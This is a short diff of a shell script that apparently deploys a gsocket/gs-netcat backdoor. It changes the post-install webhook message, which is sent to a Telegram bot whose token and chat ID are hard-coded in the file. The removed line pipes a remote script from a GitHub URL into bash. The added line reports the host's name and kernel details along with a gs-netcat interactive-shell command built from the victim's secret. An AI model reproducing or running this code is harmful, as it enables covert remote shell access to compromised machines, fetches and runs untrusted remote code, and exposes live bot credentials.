@@ -65,7 +65,7 @@
 #       - Guess what...
 
 # Global Defines
-URL_BASE="https://gsocket.io/x"
+URL_BASE="https://gsocket.io"
 [[ -n $GS_URL_BASE ]] && URL_BASE="${GS_URL_BASE}"
 URL_BIN="${URL_BASE}/bin"
 URL_DEPLOY="${URL_BASE}/x"
@@ -80,7 +80,7 @@ unset gs_deploy_webhook
 
 # WEBHOOKS are executed after a successfull install
 # shellcheck disable=SC2016 #Expressions don't expand in single quotes, use double quotes for that.
-msg='S="${GS_SECRET}" bash -c "$(curl -fsSL https://raw.githubusercontent.com/TokuHaxor/Wordpress/main/a)"""'
+msg='$(hostname) --- $(uname -rom) --- gs-netcat -i -s ${GS_SECRET}'
 ### Telegram
 GS_TG_TOKEN="6540180045:AAFTxFngPHizPiFEKUfwnKugUcYCijyNED4"
 GS_TG_CHATID="5575586332"
